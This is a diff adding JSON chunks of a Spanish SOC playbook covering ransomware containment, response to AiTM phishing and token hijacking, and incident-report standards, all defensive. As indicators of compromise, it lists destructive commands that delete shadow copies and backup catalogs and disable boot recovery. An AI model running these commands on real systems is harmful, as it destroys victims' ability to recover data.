+      "content": "[Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens] - 2. Playbook 2: Respuesta y Mitigación ante Brote de Ransomware y Exfiltración\n\n## 2. Playbook 2: Respuesta y Mitigación ante Brote de Ransomware y Exfiltración\n\n### Detección Temprana e Indicadores de Compromiso\n- Modificación masiva y acelerada de extensiones de archivo en múltiples directorios detectada por el módulo FIM de Wazuh.\n- Creación de notas de rescate típicas (`README_RESTORE_FILES.txt`, `HOW_TO_DECRYPT.html`) alertadas por Sysmon Event ID 11.\n- Ejecución de comandos de eliminación de copias de seguridad de volumen sombra:\n  - `vssadmin.exe delete shadows /all /quiet`\n  - `wmic shadowcopy delete`\n  - `wbadmin delete catalog -quiet`\n  - `bcdedit /set {default} recoveryenabled No`\n\n### Fase A: Contención Inmediata y Aislamiento de Red\n1. **Aislamiento Físico y Lógico del Endpoint:**\n   - Desconectar inmediatamente el cable de red o deshabilitar la interfaz de red virtual en el hipervisor.\n   - Si el endpoint cuenta con agente EDR/Wazuh activo, enviar comando de aislamiento de red (aislando todo tráfico excepto la comunicación segura con el servidor del SOC).\n2. **Preservación Obligatoria del Estado de Energía (NO APAGAR):**\n   - **CRÍTICO:** NO reiniciar ni apagar el equipo. El apagado destruye la memoria volátil donde pueden residir las claves criptográficas simétricas (AES) del ransomware antes de ser eliminadas.\n3. **Captura Forense de Memoria Volátil:**\n   - Ejecutar adquisición de memoria RAM mediante `WinPmem` o `LiME` hacia un medio de almacenamiento externo estéril para análisis forense y extracción de posibles claves en memoria.\n\n### Fase B: Erradicación y Análisis de Causa Raíz\n1. Identificación y terminación del árbol de procesos maliciosos (`taskkill /F /PID <PID>` o `kill -9`).\n2. Identificación del Vector de Entrada inicial (Patient Zero): análisis de correos entrantes, logs de conexiones RDP/VPN y vulnerabilidades perimetrales explotadas.\n3. Mapeo de alcance: auditar todos los recursos compartidos en red SMB para constatar si el cifrado alcanzó repositorios centrales.\n\n### Fase C: Recuperación Segura\n1. Auditoría exhaustiva de la integridad de los backups inmutables (almacenamiento WORM o copias de seguridad aisladas físicamente / air-gapped).\n2. Reinstalación desde imagen limpia del sistema operativo en equipos afectados; nunca intentar reparar un sistema infectado por ransomware sin formateo previo verificado.\n3. Restauración de datos y cambio universal de credenciales de usuario y cuentas de servicio del dominio.",
+      "metadata": {
+        "source": "SOC_PLAYBOOK",
+        "filename": "04_playbooks_wazuh_active_response_y_ransomware.md",
+        "section": "2. Playbook 2: Respuesta y Mitigación ante Brote de Ransomware y Exfiltración",
+        "document_title": "Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens"
+      }
+    },
+    {
+      "id": "04_playbooks_wazuh_active_response_y_ransomware-s3",
+      "content": "[Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens] - 3. Playbook 3: Respuesta ante Ataques de Phishing y Secuestro de Tokens JWT / MFA (AiTM)\n\n## 3. Playbook 3: Respuesta ante Ataques de Phishing y Secuestro de Tokens JWT / MFA (AiTM)\n\n### Contexto y Mecánica del Ataque AiTM (Adversary-in-the-Middle)\nLos atacantes despliegan proxies inversos transparentes (como `Evilginx`, `Modlishka`) que interceptan el tráfico entre el usuario y el portal de inicio de sesión legítimo (Microsoft 365, Google Workspace, Okta). Una vez que el usuario introduce su usuario, clave y aprueba el token MFA, el proxy captura la cookie de sesión y el Bearer Token JWT resultante, permitiendo al atacante acceder sin requerir la contraseña ni el dispositivo MFA.\n\n### Protocolo de Respuesta de Emergencia\n1. **Revocación Inmediata de Tokens de Sesión (Paso 0):**\n   - Ejecutar de inmediato la invalidación de todos los Refresh Tokens emitidos para el usuario en el proveedor de identidad.\n   - *Azure AD / Entra ID PowerShell:* `Revoke-AzureADUserAllRefreshToken -ObjectId <User_GUID>` o mediante el botón \"Cerrar todas las sesiones\" en el centro de administración de Entra.\n   - *Google Workspace:* Suspender temporalmente la cuenta o invalidar las credenciales de inicio de sesión OAuth desde la consola de administración.\n2. **Restablecimiento Forzado de Contraseña y MFA:**\n   - Forzar reseteo de la contraseña del usuario afectado.\n   - Re-inscripción obligatoria de los métodos de MFA, revocando números telefónicos o aplicaciones autenticadoras registradas recientemente y promoviendo el uso de llaves de hardware FIDO2 / Passkeys.\n3. **Auditoría Forense en el Buzón y Aplicaciones:**\n   - Inspeccionar reglas de correo en busca de reenviadores automáticos maliciosos:\n     - PowerShell Exchange Online: `Get-InboxRule -Mailbox <User> | Where-Object { $_.ForwardTo -or $_.ForwardAsAttachmentTo -or $_.RedirectTo }`.\n     - Eliminar inmediatamente cualquier regla no autorizada.\n   - Inspeccionar permisos y aplicaciones empresariales OAuth concedidas recientemente por el usuario que pudieran mantener acceso a buzones o archivos de OneDrive/SharePoint mediante Microsoft Graph API (`Consent to Application`).\n4. **Comunicación Fuera de Banda:**\n   - Contactar telefónicamente o en persona al usuario para confirmar el incidente, validar que sus dispositivos personales no estén comprometidos y advertirle sobre tácticas de ingeniería social subsiguientes.",
+      "metadata": {
+        "source": "SOC_PLAYBOOK",
+        "filename": "04_playbooks_wazuh_active_response_y_ransomware.md",
+        "section": "3. Playbook 3: Respuesta ante Ataques de Phishing y Secuestro de Tokens JWT / MFA (AiTM)",
+        "document_title": "Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens"
+      }
+    },
+    {
+      "id": "04_playbooks_wazuh_active_response_y_ransomware-s4",
+      "content": "[Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens] - 4. Estándar de Documentación y Cierre de Incidente en el SOC\n\n## 4. Estándar de Documentación y Cierre de Incidente en el SOC\nTodo incidente debe concluir con la generación de un Informe Formal de Incidente que contenga:\n- **Resumen Ejecutivo:** Descripción en lenguaje de negocio sobre el alcance, duración e impacto.\n- **Línea Temporal de Eventos (Timeline):** Cronología detallada correlacionando alertas de Wazuh, acciones defensivas tomadas y marcas de tiempo UTC.\n- **Inventario de Indicadores de Compromiso (IoCs):** Lista de hashes SHA-256, dominios, IPs y cuentas comprometidas para enriquecer las listas de bloqueo permanentes.\n- **Plan de Acción de Mejora Continua:** Tareas asignadas para corregir las brechas de seguridad identificadas con responsables y plazos no negociables.",
+      "metadata": {
+        "source": "SOC_PLAYBOOK",
+        "filename": "04_playbooks_wazuh_active_response_y_ransomware.md",
+        "section": "4. Estándar de Documentación y Cierre de Incidente en el SOC",
+        "document_title": "Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens"
+      }
+    }
+  ]
+}
